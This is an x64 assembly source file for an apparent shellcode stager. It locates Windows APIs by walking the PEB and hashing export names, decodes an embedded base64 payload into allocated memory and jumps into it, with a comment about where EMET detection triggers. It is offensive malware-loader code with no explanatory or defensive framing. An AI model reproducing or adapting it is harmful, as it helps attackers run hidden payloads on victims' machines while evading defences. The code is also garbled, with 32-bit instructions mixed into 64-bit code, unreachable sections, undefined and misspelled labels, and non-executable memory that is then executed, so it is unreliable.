    




    bits   64
    
    ; shadow or home space for API call
    struc home_space
      ._rcx  resq 1
      ._rdx  resq 1
      ._r8   resq 1
      ._r9   resq 1
    endstruc

    ; structure for stack allocation
    struc work_space
      hs                   resb home_space_size
      
      arg0                 resq 1
      arg1                 resq 1
      arg2                 resq 1
      arg3                 resq 1
      arg4                 resq 1
      
      ; local variables
      inlen                resd 1
      outlen               resd 1
      outbuf               resq 1
      
      ; function pointers
      _lstrlenA            resq 1
      _CryptStringToBinary resq 1
      _VirtualAlloc        resq 1
      _VirualFree          resq 1
      _RtlExitUserThread   resq 1
    endstruc

    %define WORK_SPACE_LEN ((work_space_size & -16) + 16) - 8 
    
deocde_base64:
    ; save non-volatile registers
    pushx  rsi, rbx, rdi, rbp
    ; search the import table of kernel32.dll for address of GetProcAddress and LoadLibraryA
    push   TEB.ProcessEnvironmentBlock
    pop    rdx
    
    mov    rbx, [gs:rdx]         ; rbx = ProcessEnvironmentBlock
    mov    rbx, [rbx+PEB.Ldr]    ; rbx = ImageBaseAddress
    add    edx, [rbx+3ch]        ; rdx += e_lfanew
    mov    rsi, [rbx+rdx+88h]
    add    rsi, rbx
L1:
    lodsq                            ; OriginalFirstThunk +00h
    mov    rax, [rdx+rbx]
    or     rax, 2020202020202020h    ; convert to lowercase
    cmp    rax, 'kernel32'
    jnz    L1
    
    ; locate GetProcAddress
    mov    ecx, 'GetP'
    mov    edx, 'ddre'
    call   get_imp
    push   eax               ; save pointer 
    
    ; locate LoadLibraryA
    mov    ecx, 'Load'
    mov    edx, 'aryA'
    call   get_imp
    pop    ebp               ; ebp = GetProcAddress
    xchg   eax, ebx          ; ebx = LoadLibraryA
    
    pop    edi
    pop    esi
    ret
    
    pop    rdi                         ; rdi = api_tbl
    sub    rsp, WORK_SPACE_LEN
    push   rsp
    pop    rbx
    
    ; inlen = lstrlen(_base64)
    xor    eax, eax
    lea    rax, [rdi + 3 * 8]          ; rax = _base64
    push   rax
    call   qword[rdi + 0 * 8]          ; _lstrlenA
    mov    dword[rbx + outlen], eax
    
    ; CryptStringToBinary(_base64, inlen,
        ; CRYPT_STRING_ANY, NULL, (PDWORD)outlen, NULL, NULL)        
    xor    edx, edx                    ; edx = 0
    mov    [rbx + arg2], rdx           ; NULL
    mov    [rbx + arg1], rdx           ; NULL
    lea    rcx, [rbx + outlen]
    mov    [rbx + arg0], rcx           ; outlen
    push   CRYPT_STRING_ANY            ; r9 = CRYPT_STRING_ANY
    pop    r9                          ; 
    mov    edx, [rbx + inlen]          ; rdx = inlen
    lea    rcx, [rdi + 3 * 8]          ; rcx = _base64
    call   qword[rdi + 1 * 8]          ; _CryptStringToBinary
    
    ; out = VirtualAlloc(NULL, outlen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    push   PAGE_READWRITE
    pop    r9
    push   (MEM_COMMIT | MEM_RESERVE) >> 8
    pop    r8
    shl    r8, 8
    mov    edx, [rbx + outlen]         ; rdx = outlen
    xor    ecx, ecx                    ; rcx = 0 
    call   qword[rdi + 2 * 8]          ; _VirtualAlloc
    mov    [rbx + outbuf], rax
    
    ; CryptStringToBinary(in, inlen,
        ; CRYPT_STRING_ANY, NULL, (PDWORD)outlen, NULL, NULL)        
    xor    edx, edx                    ; edx = 0
    mov    [rbx + arg2], rdx           ; NULL
    mov    [rbx + arg1], rdx           ; NULL
    lea    rcx, [rbx + outlen]
    mov    [rbx + arg0], rcx           ; outlen
    push   CRYPT_STRING_ANY            ; r9 = CRYPT_STRING_ANY
    pop    r9                          ; 
    mov    edx, [rbx + inlen]          ; rdx = inlen
    lea    rcx, [rdi + 3 * 8]          ; rcx = _base64
    call   qword[rdi + 1 * 8]          ; _CryptStringToBinary
    
    mov    rax, [rbx + outbuf]
    
    add    rsp, WORK_SPACE_LEN
    popx   rsi, rbx, rdi, rbp
    jmp    rax                         ; jump to code

init_api_tbl:
    call   decode_main

getapi:
    bits   64
    push   rsi
    push   rdi
    push   rbx
    push   rcx
    
    mov    r8, rax
    push   60h
    pop    rsi
    mov    rax, qword [gs:rsi]
    mov    rax, [rax+18h]
    mov    r10, [rax+30h]
l_dll:
    mov    rbp, [r10+10h]
    test   rbp, rbp
    mov    eax, ebp
    jz     xit_getapi
    mov    r10, [r10]
    
    mov    eax, [rbp+3Ch]      ; IMAGE_DOS_HEADER.e_lfanew
    add    eax, 10h
    mov    eax, [rbp+rax+78h]
    lea    rsi, [rbp+rax+18h]  ; IMAGE_EXPORT_DIRECTORY.NumberOfNames
    lodsd
    xchg   eax, ecx
    jecxz  l_dll

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    
    ; EMET will break on the following instruction
    lea    r11, [rbp+rax]

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNames
    lea    rdi, [rbp+rax]

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
    lea    rbx, [rbp+rax]
l_api:
    mov    esi, [rdi+4*rcx-4]
    add    rsi, rbp
    xor    eax, eax
    cdq
h_api:
    lodsb
    add    edx, eax
    rol    edx, ROL_N
    dec    eax
    jns    h_api
    
    cmp    edx, r8d

    loopne l_api
    jne    l_dll
    
    movzx  edx, word [rbx+2*rcx]
    mov    eax, [r11+4*rdx]
    add    rax, rbp
xit_getapi:
    pop    rcx
    pop    rbx
    pop    rdi
    pop    rsi
    ret
    
    